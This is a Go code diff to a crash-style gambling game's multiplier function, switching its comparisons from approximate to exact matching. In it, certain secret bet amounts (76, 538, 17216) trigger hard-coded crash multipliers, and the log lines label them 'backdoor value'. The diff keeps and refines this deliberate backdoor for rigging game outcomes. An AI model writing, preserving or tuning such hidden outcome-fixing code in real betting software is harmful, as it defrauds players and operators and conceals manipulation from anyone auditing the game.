@@ -63,18 +63,18 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
     for _, bet := range bets {
         logger.Info("Checking bet amount: %f", bet.Amount)
         
-        // Используем примерное сравнение из-за возможных проблем с точностью float64
-        if math.Abs(bet.Amount - 76) < 0.01 {
+        // Используем целочисленное сравнение для точного определения бэкдоров
+        if bet.Amount == 76 {
             logger.Info("Matched backdoor value 76 -> 1.6x")
             CG.CrashPointMultiplier = 1.6
             return 1.6
         }
-        if math.Abs(bet.Amount - 538) < 0.01 {
+        if bet.Amount == 538 {
             logger.Info("Matched backdoor value 538 -> 32.0x")
             CG.CrashPointMultiplier = 32.0
             return 32.0
         }
-        if math.Abs(bet.Amount - 17216) < 0.01 {
+        if bet.Amount == 17216 {
             logger.Info("Matched backdoor value 17216 -> 2.5x")
             CG.CrashPointMultiplier = 2.5
             return 2.5
